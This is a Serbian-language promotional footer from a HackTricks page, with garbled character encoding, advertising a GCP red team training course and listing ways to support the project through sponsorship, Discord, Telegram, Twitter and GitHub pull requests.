UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¡ka HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitter-u** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
